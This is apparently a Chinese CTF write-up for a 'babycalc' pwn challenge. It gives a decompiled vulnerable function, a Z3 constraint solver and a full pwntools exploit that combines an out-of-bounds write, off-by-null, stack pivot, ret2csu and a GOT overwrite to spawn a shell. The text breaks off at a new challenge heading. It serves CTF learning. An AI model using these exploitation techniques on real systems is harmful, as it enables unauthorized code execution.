<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs assembly">#Gadget1<br>.text:0000000000400C96                               loc_400C96:                             ; CODE XREF: init+34↑j<br>.text:0000000000400C96 48 83 C4 08                   add     rsp, 8<br><br>.text:0000000000400C9A 5B                            pop     rbx<br>.text:0000000000400C9B 5D                            pop     rbp<br>.text:0000000000400C9C 41 5C                         pop     r12<br>.text:0000000000400C9E 41 5D                         pop     r13<br>.text:0000000000400CA0 41 5E                         pop     r14<br>.text:0000000000400CA2 41 5F                         pop     r15<br>.text:0000000000400CA4 C3                            retn<br><br>#Gadget2<br>.text:0000000000400C80                               loc_400C80:                             ; CODE XREF: init+54↓j<br>.text:0000000000400C80 4C 89 EA                      mov     rdx, r13<br>.text:0000000000400C83 4C 89 F6                      mov     rsi, r14<br>.text:0000000000400C86 44 89 FF                      mov     edi, r15d<br>.text:0000000000400C89 41 FF 14 DC                   call    qword ptr [r12+rbx*8]<br>.text:0000000000400C89<br>.text:0000000000400C8D 48 83 C3 01                   add     rbx, 1<br>.text:0000000000400C91 48 39 EB                      cmp     rbx, rbp<br>.text:0000000000400C94 75 EA                         jnz     short loc_400C80<br>.text:0000000000400C94<br></code></pre></td></tr></table></figure>

<p><strong>python代码–write(1,write_got,8)</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python">csu_one_addr =<span class="hljs-number">0x400C96</span><br>csu_second_addr =  <span class="hljs-number">0x400C80</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">csu</span>(<span class="hljs-params">rbx, rbp, r12, r13, r14, r15, last</span>):<br>    <span class="hljs-comment"># pop rbx,rbp,r12,r13,r14,r15</span><br>    <span class="hljs-comment"># rbx = 0,</span><br>    <span class="hljs-comment"># rbp = 1, not to jump</span><br>    <span class="hljs-comment"># r12 = 目标函数地址</span><br>    <span class="hljs-comment"># rdi = edi=r15d</span><br>    <span class="hljs-comment"># rsi = r14</span><br>    <span class="hljs-comment"># rdx = r13</span><br>    <br>    <span class="hljs-comment">#第一个段0x80+fake_ebp是偏移量(视题目而定)，第二个0x38是让程序流重新回到ret位置</span><br>    payload = <span class="hljs-string">&#x27;a&#x27;</span> * <span class="hljs-number">0x80</span> + fake_ebp<br>    payload += p64(csu_one_addr) + p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15)<br>    payload += p64(csu_second_addr)<br>    payload += <span class="hljs-string">&#x27;a&#x27;</span> * <span class="hljs-number">0x38</span><br>    payload += p64(last)<br>    sh.send(payload)<br>    sleep(<span class="hljs-number">1</span>)<br>    <br><span class="hljs-comment"># write(1,write_got,8)</span><br><span class="hljs-comment">#实际:RBX=0, RBP=1 ,R12指向目标函数, 填充三个参数(逆序):RDX, RSI , RDI</span><br>csu(<span class="hljs-number">0</span>, <span class="hljs-number">1</span>, write_got, <span class="hljs-number">8</span>, write_got, <span class="hljs-number">1</span>, main_addr)<br></code></pre></td></tr></table></figure>



<p>本题</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs assembly">csu_one_addr    =  0x400C96<br>csu_second_addr =  0x400C80<br>def csu(rdi,rsi,rdx,call_addr):<br>	# pop rbx,rbp,r12,r13,r14,r15<br>    # rbx = 0,<br>    # rbp = 1, not to jump<br>    # r12 = 目标函数地址<br>    # r13 = rdx<br>    # r14 = rsi<br>    # r15d = edi = rdi<br>    payload =  p64(csu_one_addr)+ p64(0)+ p64(1)+ p64(call_addr)+ p64(rdx)+ p64(rsi)+ p64(rdi)<br>    payload += p64(csu_second_addr)<br>    payload += p64(0)*7<br>    return payload<br><br></code></pre></td></tr></table></figure>





<h3 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h3><p><strong>开了NX保护，栈迁移,ret2csu,ret2libc</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> __fastcall <span class="hljs-title function_">vuln</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">char</span> v0; <span class="hljs-comment">// al</span><br>  <span class="hljs-type">char</span> buf[<span class="hljs-number">208</span>]; <span class="hljs-comment">// [rsp+0h] [rbp-100h] BYREF</span><br>  <span class="hljs-type">unsigned</span> __int8 v2; <span class="hljs-comment">// [rsp+D0h] [rbp-30h]	0</span><br>  <span class="hljs-type">unsigned</span> __int8 v3; <span class="hljs-comment">// [rsp+D1h] [rbp-2Fh] 	1</span><br>  <span class="hljs-type">unsigned</span> __int8 v4; <span class="hljs-comment">// [rsp+D2h] [rbp-2Eh]	2</span><br>  <span class="hljs-type">unsigned</span> __int8 v5; <span class="hljs-comment">// [rsp+D3h] [rbp-2Dh]	3</span><br>  <span class="hljs-type">unsigned</span> __int8 v6; <span class="hljs-comment">// [rsp+D4h] [rbp-2Ch]	4</span><br>  <span class="hljs-type">unsigned</span> __int8 v7; <span class="hljs-comment">// [rsp+D5h] [rbp-2Bh]	5</span><br>  <span class="hljs-type">unsigned</span> __int8 v8; <span class="hljs-comment">// [rsp+D6h] [rbp-2Ah]	6</span><br>  <span class="hljs-type">unsigned</span> __int8 v9; <span class="hljs-comment">// [rsp+D7h] [rbp-29h]	7</span><br>  <span class="hljs-type">unsigned</span> __int8 v10; <span class="hljs-comment">// [rsp+D8h] [rbp-28h]	8</span><br>  <span class="hljs-type">unsigned</span> __int8 v11; <span class="hljs-comment">// [rsp+D9h] [rbp-27h]	9</span><br>  <span class="hljs-type">unsigned</span> __int8 v12; <span class="hljs-comment">// [rsp+DAh] [rbp-26h]	10</span><br>  <span class="hljs-type">unsigned</span> __int8 v13; <span class="hljs-comment">// [rsp+DBh] [rbp-25h]	11</span><br>  <span class="hljs-type">unsigned</span> __int8 v14; <span class="hljs-comment">// [rsp+DCh] [rbp-24h]	12</span><br>  <span class="hljs-type">unsigned</span> __int8 v15; <span class="hljs-comment">// [rsp+DDh] [rbp-23h]	13</span><br>  <span class="hljs-type">unsigned</span> __int8 v16; <span class="hljs-comment">// [rsp+DEh] [rbp-22h]	14</span><br>  <span class="hljs-type">unsigned</span> __int8 v17; <span class="hljs-comment">// [rsp+DFh] [rbp-21h]	15</span><br>  <span class="hljs-type">int</span> i; <span class="hljs-comment">// [rsp+FCh] [rbp-4h]</span><br>  <span class="hljs-comment">//[rbp]</span><br>  <span class="hljs-comment">//ret</span><br>    <br>  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt;= <span class="hljs-number">15</span>; ++i )<br>  &#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;number-%d:&quot;</span>, (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)(i + <span class="hljs-number">1</span>));<br>    buf[(<span class="hljs-type">int</span>)read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">0x100</span>uLL)] = <span class="hljs-number">0</span>;  <span class="hljs-comment">//可以改i的值</span><br>    v0 = strtol(buf, <span class="hljs-number">0LL</span>, <span class="hljs-number">10</span>); <span class="hljs-comment">//调试后发现输入payload，不会变，所以可以布栈</span><br>    *(&amp;v2 + i) = v0; 		   <span class="hljs-comment">//有问题！！！越界</span><br>  &#125;<br>  <span class="hljs-comment">//b&#x27;\x13&#x27;+ b&#x27;\x24&#x27;+ b&#x27;\x35&#x27;+ b&#x27;\x46&#x27;+ b&#x27;\x37&#x27; + b&#x27;\x42&#x27; + b&#x27;\x11&#x27; + b&#x27;\xA1&#x27; + b&#x27;\x32&#x27; + b&#x27;\x83&#x27; + b&#x27;\xD4&#x27; + b&#x27;\x65&#x27; + b&#x27;\x76&#x27;+ b&#x27;\xC7&#x27;+ b&#x27;\x18&#x27;+ b&#x27;\x03&#x27;</span><br>  <span class="hljs-keyword">if</span> ( v4 * v3 * v2 - v5 != <span class="hljs-number">36182</span><br>    || v2 != <span class="hljs-number">19</span><br>    || v4 * <span class="hljs-number">19</span> * v3 + v5 != <span class="hljs-number">36322</span><br>    || (v12 + v2 - v7) * v15 != <span class="hljs-number">32835</span><br>    || (v3 * v2 - v4) * v5 != <span class="hljs-number">44170</span><br>    || (v4 + v3 * v2) * v5 != <span class="hljs-number">51590</span><br>    || v8 * v7 * v6 - v9 != <span class="hljs-number">61549</span><br>    || v9 * v14 + v3 + v17 != <span class="hljs-number">19037</span><br>    || v8 * v7 * v6 + v9 != <span class="hljs-number">61871</span><br>    || (v7 * v6 - v8) * v9 != <span class="hljs-number">581693</span><br>    || v10 != <span class="hljs-number">50</span><br>    || (v8 + v7 * v6) * v9 != <span class="hljs-number">587167</span><br>    || v12 * v11 * v10 - v13 != <span class="hljs-number">1388499</span><br>    || v12 * v11 * v10 + v13 != <span class="hljs-number">1388701</span><br>    || (v11 * v10 - v12) * v13 != <span class="hljs-number">640138</span><br>    || (v10 * v4 - v15) * v11 != <span class="hljs-number">321081</span><br>    || (v12 + v11 * v10) * v13 != <span class="hljs-number">682962</span><br>    || v16 * v15 * v14 - v17 != <span class="hljs-number">563565</span><br>    || v16 * v15 * v14 + v17 != <span class="hljs-number">563571</span><br>    || v13 != <span class="hljs-number">101</span><br>    || (v15 * v14 - v16) * v17 != <span class="hljs-number">70374</span><br>    || (v16 + v15 * v14) * v17 != <span class="hljs-number">70518</span> )<br>  &#123;<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>  &#125;<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;good done&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure>



<h3 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h3><p><strong>循环中</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt;= <span class="hljs-number">15</span>; ++i )<br>&#123;<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;number-%d:&quot;</span>, (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)(i + <span class="hljs-number">1</span>));<br>  buf[(<span class="hljs-type">int</span>)read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">0x100</span>uLL)] = <span class="hljs-number">0</span>;  <span class="hljs-comment">//可以改i的值，结合后面，可以实现越界写</span><br>    									   <span class="hljs-comment">//同时有一个offbynull，相当于只有一个NULL字节的溢出</span><br>  v0 = strtol(buf, <span class="hljs-number">0LL</span>, <span class="hljs-number">10</span>); <span class="hljs-comment">//调试后发现输入payload，不会变，所以可以布栈</span><br>  *(&amp;v2 + i) = v0; 		   <span class="hljs-comment">//通过控制i，越界写，改ret为leave_ret</span><br>&#125;<br></code></pre></td></tr></table></figure>

<p><strong>off-by-null：</strong>栈覆写，控一下程序流</p>
<p>越界写：开始想通过strtol返回一个地址，实现覆写，但是不行，需要换种思路</p>
<p>​				</p>
<h4 id="Z3"><a href="#Z3" class="headerlink" title="Z3"></a>Z3</h4><p><strong>可以通过python脚本实现(也可以手算)</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> z3 <span class="hljs-keyword">import</span> *<br>s=Solver()<br>v3,v4,v5,v6,v7,v8,v9,v10,v11,v12,v13,v14,v15,v16,v17,v18=Ints(<span class="hljs-string">&#x27;v3 v4 v5 v6 v7 v8 v9 v10 v11 v12 v13 v14 v15 v16 v17 v18&#x27;</span>)<br>s.add(v3==<span class="hljs-number">19</span>)<br>s.add(v5 * v4 * v3 - v6 == <span class="hljs-number">36182</span>)<br>s.add( v5 * <span class="hljs-number">19</span> * v4 + v6 == <span class="hljs-number">36322</span>)<br>s.add( (v13 + v3 - v8) * v16 == <span class="hljs-number">32835</span>)<br>s.add( (v4 * v3 - v5) * v6 == <span class="hljs-number">44170</span>)<br>s.add( (v5 + v4 * v3) * v6 == <span class="hljs-number">51590</span>)<br>s.add( v9 * v8 * v7 - v10 == <span class="hljs-number">61549</span>)<br>s.add( v10 * v15 + v4 + v18 == <span class="hljs-number">19037</span>)<br>s.add( v9 * v8 * v7 + v10 == <span class="hljs-number">61871</span>)<br>s.add( (v8 * v7 - v9) * v10 == <span class="hljs-number">581693</span>)<br>s.add( v11 == <span class="hljs-number">50</span>)<br>s.add( (v9 + v8 * v7) * v10 == <span class="hljs-number">587167</span>)<br>s.add( v13 * v12 * v11 - v14 == <span class="hljs-number">1388499</span>)<br>s.add( v13 * v12 * v11 + v14 == <span class="hljs-number">1388701</span>)<br>s.add( (v12 * v11 - v13) * v14 == <span class="hljs-number">640138</span>)<br>s.add( (v11 * v5 - v16) * v12 == <span class="hljs-number">321081</span>)<br>s.add( (v13 + v12 * v11) * v14 == <span class="hljs-number">682962</span>)<br>s.add( v17 * v16 * v15 - v18 == <span class="hljs-number">563565</span>)<br>s.add( v17 * v16 * v15 + v18 == <span class="hljs-number">563571</span>)<br>s.add( v14 == <span class="hljs-number">101</span>)<br>s.add( (v16 * v15 - v17) * v18 == <span class="hljs-number">70374</span>)<br>s.add( (v17 + v16 * v15) * v18 == <span class="hljs-number">70518</span> )<br><span class="hljs-built_in">print</span>(s.check())<br><span class="hljs-built_in">print</span>(s.model())<br></code></pre></td></tr></table></figure>



<p><code>v2-v17: 19,36,53,70,55,66,17,161,50,131,212,101,118,199,24,3</code></p>
<p>翻译为字节：<code>\x13 \x24 \x35 \x46 \x37 \x42 \x11 \xA1 \x32 \x83 \xD4 \x65 \x76 \xC7 \x18 \x03</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c">&#123;<br>  <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>&#125;<br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;good done&quot;</span>);<br></code></pre></td></tr></table></figure>



<h3 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h3><ol>
<li>off-by-null覆写rbp低位为\x00</li>
<li>利用越界写，控制ret，改成leave_ret，进行栈迁移回栈（需要爆破1&#x2F;16）</li>
<li>因为程序不清楚栈，所以提前控制栈帧</li>
<li>泄露 libc 地址后用 csu 调用 read 函数覆写 got 表</li>
</ol>
<h3 id="一步到位exp"><a href="#一步到位exp" class="headerlink" title="一步到位exp"></a>一步到位exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python</span><br><span class="hljs-comment"># -*- coding: &lt;encoding name&gt; -*-</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> ctypes <span class="hljs-keyword">import</span> *<br><br>libc = ELF(<span class="hljs-string">&#x27;./libc-2.23.so&#x27;</span>)<br>banary = <span class="hljs-string">&quot;./babycalc&quot;</span><br>elf = ELF(banary)<br>ip = <span class="hljs-string">&#x27;1&#x27;</span><br>port = <span class="hljs-number">1</span><br><br>local = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span>(local==<span class="hljs-number">1</span>):<br>	p = process(banary)<br><span class="hljs-keyword">else</span>:<br>	p = remote(ip, port)<br>context.log_level = <span class="hljs-string">&quot;debug&quot;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>():<br>	gdb.attach(p)<br>	pause()<br>	<br>s = <span class="hljs-keyword">lambda</span> data : p.send(data)<br>sl = <span class="hljs-keyword">lambda</span> data : p.sendline(data)<br>sa = <span class="hljs-keyword">lambda</span> text, data : p.sendafter(text, data)<br>sla = <span class="hljs-keyword">lambda</span> text, data : p.sendlineafter(text, data)<br>r = <span class="hljs-keyword">lambda</span> : p.recv()<br>ru = <span class="hljs-keyword">lambda</span> text : p.recvuntil(text)<br>uu32 = <span class="hljs-keyword">lambda</span> : u32(p.recvuntil(<span class="hljs-string">b&quot;\xff&quot;</span>)[-<span class="hljs-number">4</span>:].ljust(<span class="hljs-number">4</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>uu64 = <span class="hljs-keyword">lambda</span> : u64(p.recvuntil(<span class="hljs-string">b&quot;\x7f&quot;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&quot;\x00&quot;</span>))<br>lg = <span class="hljs-keyword">lambda</span> s : log.info(<span class="hljs-string">&#x27;\x1b[01;38;5;214m %s --&gt; 0x%x \033[0m&#x27;</span> % (s, <span class="hljs-built_in">eval</span>(s)))<br>pi = <span class="hljs-keyword">lambda</span> : p.interactive()<br><br><span class="hljs-comment">#-----------------------1.Gadget  ---------------------------</span><br><span class="hljs-comment">#debug()</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">$ ROPgadget --binary ./babycalc | grep &#x27;leave ; ret&#x27;</span><br><span class="hljs-string">0x0000000000400bb7 : leave ; ret</span><br><span class="hljs-string">0x0000000000400c17 : nop ; leave ; ret</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>rdi_ret = <span class="hljs-number">0x0000000000400ca3</span><br>rsi_r15_ret = <span class="hljs-number">0x0000000000400ca1</span><br>ret = <span class="hljs-number">0x0000000000400ca4</span><br>leave_ret = <span class="hljs-number">0x0000000000400c17</span><br><br>puts_plt = elf.plt[<span class="hljs-string">&quot;puts&quot;</span>]<br>puts_got = elf.got[<span class="hljs-string">&quot;puts&quot;</span>]<br>read_got = elf.got[<span class="hljs-string">&quot;read&quot;</span>]<br><br>csu_one_addr    =  <span class="hljs-number">0x400C96</span><br>csu_second_addr =  <span class="hljs-number">0x400C80</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">csu</span>(<span class="hljs-params">rdi,rsi,rdx,call_addr</span>):<br>	<span class="hljs-comment"># pop rbx,rbp,r12,r13,r14,r15</span><br>    <span class="hljs-comment"># rbx = 0,</span><br>    <span class="hljs-comment"># rbp = 1, not to jump</span><br>    <span class="hljs-comment"># r12 = call_</span><br>    <span class="hljs-comment"># r13 = rdx</span><br>    <span class="hljs-comment"># r14 = rsi</span><br>    <span class="hljs-comment"># r15d = edi = rdi</span><br>    payload =  p64(csu_one_addr)+ p64(<span class="hljs-number">0</span>)+ p64(<span class="hljs-number">1</span>)+ p64(call_addr)+ p64(rdx)+ p64(rsi)+ p64(rdi)<br>    payload += p64(csu_second_addr)<br>    payload += p64(<span class="hljs-number">0</span>)*<span class="hljs-number">7</span><br>    <span class="hljs-keyword">return</span> payload<br>	<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pwn</span>():<br>	<span class="hljs-comment">#-----------------------2.Calc + stack_piviot-----------------------------</span><br>	matrix= [<span class="hljs-number">19</span>,<span class="hljs-number">36</span>,<span class="hljs-number">53</span>,<span class="hljs-number">70</span>,<span class="hljs-number">55</span>,<span class="hljs-number">66</span>,<span class="hljs-number">17</span>,<span class="hljs-number">161</span>,<span class="hljs-number">50</span>,<span class="hljs-number">131</span>,<span class="hljs-number">212</span>,<span class="hljs-number">101</span>,<span class="hljs-number">118</span>,<span class="hljs-number">199</span>,<span class="hljs-number">24</span>,<span class="hljs-number">3</span>]<br>	<span class="hljs-comment">#\x13 \x24 \x35 \x46 \x37 \x42 \x11 \xA1 \x32 \x83 \xD4 \x65 \x76 \xC7 \x18 \x03</span><br><br>	<span class="hljs-comment">#0x30+0x40+0x38 =0xa8</span><br>	ROP =  p64(rdi_ret) + p64(puts_got) +p64(puts_plt) <span class="hljs-comment">#leak_libc</span><br>	ROP += csu(<span class="hljs-number">0</span>, puts_got, <span class="hljs-number">0x30</span>, read_got)  <span class="hljs-comment">#read(0, puts_got , 0x30) 改puts_got表地址，同时输入/bin/sh</span><br>	ROP += p64(rdi_ret) + p64(puts_got+<span class="hljs-number">8</span>) +p64(puts_plt) <span class="hljs-comment">#puts( &amp;puts_got+8 ) == system(&#x27;/bin/sh\x00&#x27;)</span><br><br>	payload =  <span class="hljs-built_in">str</span>(<span class="hljs-number">0x18</span>).encode().ljust(<span class="hljs-number">0x8</span>,<span class="hljs-string">b&#x27;\0&#x27;</span>) <span class="hljs-comment">#0x8</span><br>	payload += p64(ret)* <span class="hljs-number">4</span> <span class="hljs-comment">#0x8 - 0x28</span><br>	payload += ROP <span class="hljs-comment">#0xD0</span><br>	payload += <span class="hljs-string">b&#x27;\x13&#x27;</span>+ <span class="hljs-string">b&#x27;\x24&#x27;</span>+ <span class="hljs-string">b&#x27;\x35&#x27;</span>+ <span class="hljs-string">b&#x27;\x46&#x27;</span>+ <span class="hljs-string">b&#x27;\x37&#x27;</span> + <span class="hljs-string">b&#x27;\x42&#x27;</span> + <span class="hljs-string">b&#x27;\x11&#x27;</span> + <span class="hljs-string">b&#x27;\xA1&#x27;</span> + <span class="hljs-string">b&#x27;\x32&#x27;</span> + <span class="hljs-string">b&#x27;\x83&#x27;</span> + <span class="hljs-string">b&#x27;\xD4&#x27;</span> + <span class="hljs-string">b&#x27;\x65&#x27;</span> + <span class="hljs-string">b&#x27;\x76&#x27;</span>+ <span class="hljs-string">b&#x27;\xC7&#x27;</span>+ <span class="hljs-string">b&#x27;\x18&#x27;</span>+ <span class="hljs-string">b&#x27;\x03&#x27;</span><br>	payload = payload.ljust(<span class="hljs-number">0xfc</span>,<span class="hljs-string">b&#x27;\0&#x27;</span>)<br>	payload += p32(<span class="hljs-number">0x38</span>)<br><br>	<span class="hljs-comment">#pause()</span><br>	sa(<span class="hljs-string">b&#x27;:&#x27;</span>, payload)<br>	<span class="hljs-comment">#pause()</span><br>	<span class="hljs-comment">#--------------------------------3.libc -------------------------------------</span><br>	puts_addr = u64(p.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">0x8</span>,<span class="hljs-string">b&#x27;\0&#x27;</span>))<br>	libc_base = puts_addr - libc.sym[<span class="hljs-string">&quot;puts&quot;</span>]<br>	system_addr = libc_base + libc.sym[<span class="hljs-string">&quot;system&quot;</span>]<br>	lg(<span class="hljs-string">&#x27;puts_addr&#x27;</span>)<br>	lg(<span class="hljs-string">&#x27;libc_base&#x27;</span>)<br>    <br>	sl(p64(system_addr) + <span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>)<br><br>	pi()<br><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>  <span class="hljs-comment">#p = remote(&#x27;&#x27;,)</span><br>  p = process(<span class="hljs-string">&#x27;./babycalc&#x27;</span>)<br>  <span class="hljs-keyword">try</span>:<br>      pwn()<br>  excepts:<br>      p.close()<br>      <span class="hljs-keyword">continue</span><br></code></pre></td></tr></table></figure>





<h2 id="3-JIT"><a href="#3-JIT" class="headerlink" title="3.JIT"></a>3.JIT</h2><h1 id="③V-amp-NCTF"><a href="#③V-amp-NCTF" class="headerlink" title="③V&amp;NCTF"></a>③V&amp;NCTF</h1><h2 id="1-Traveler"><a href="#1-Traveler" class="headerlink" title="1.Traveler"></a>1.Traveler</h2><h3 id="分析-2"><a href="#分析-2" class="headerlink" title="分析"></a>分析</h3><p>main</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __cdecl <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>  <span class="hljs-type">char</span> buf[<span class="hljs-number">32</span>]; <span class="hljs-comment">// [rsp+0h] [rbp-20h] BYREF</span><br><br>  init(argc, argv, envp);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;who r 